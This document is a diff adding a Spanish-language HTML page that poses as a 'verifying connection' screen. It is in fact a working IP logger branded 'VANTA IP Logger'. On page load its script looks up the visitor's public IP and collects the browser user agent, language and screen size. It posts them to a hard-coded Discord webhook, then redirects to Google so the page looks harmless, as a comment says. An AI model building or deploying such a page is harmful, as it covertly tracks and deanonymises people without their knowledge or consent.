@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Restringido - Verificando Conexión</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(0,0,0,0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border-left-color: #09f;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Verificando Conexión</h2>
+        <p>Por favor espere mientras validamos su acceso...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- CAMBIA ESTO POR TU WEBHOOK -->
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1560433276051660876/a9658X8PpVHmYGJKmtLiXzUv_0mqdhMsREzYfCQ4RiCajEC-Y34Gl7dwaayD9y5ikm2p";
+
+        function isValidIP(ip) {
+            const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+            const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:))/;
+            return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+        }
+
+        async function getIP() {
+            // Fallback de 3 APIs distintas para precisión absoluta
+            const apis = [
+                { url: 'https://api.ipify.org?format=json', key: 'ip' },
+                { url: 'https://api64.ipify.org?format=json', key: 'ip' },
+                { url: 'https://ipapi.co/json/', key: 'ip' }
+            ];
+
+            for (let api of apis) {
+                try {
+                    const res = await fetch(api.url);
+                    if (!res.ok) continue;
+                    const data = await res.json();
+                    if (data[api.key] && isValidIP(data[api.key])) {
+                        return data[api.key];
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            return "No se pudo resolver la IP";
+        }
+
+        async function sendToWebhook(ip) {
+            const payload = {
+                embeds: [{
+                    title: "Nueva Conexión Detectada",
+                    color: 3447003,
+                    fields: [
+                        { name: "IP Pública", value: "`" + ip + "`", inline: false },
+                        { name: "User Agent", value: "```" + navigator.userAgent + "```", inline: false },
+                        { name: "Idioma", value: navigator.language || "Desconocido", inline: true },
+                        { name: "Resolución", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                    ],
+                    footer: { text: "VANTA IP Logger" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {}
+        }
+
+        window.onload = async () => {
+            const ip = await getIP();
+            await sendToWebhook(ip);
+            // Redirigir a Google para que parezca un sitio normal
+            setTimeout(() => window.location.href = "https://www.google.com", 2000);
+        };
+    </script>
+</body>
+</html>
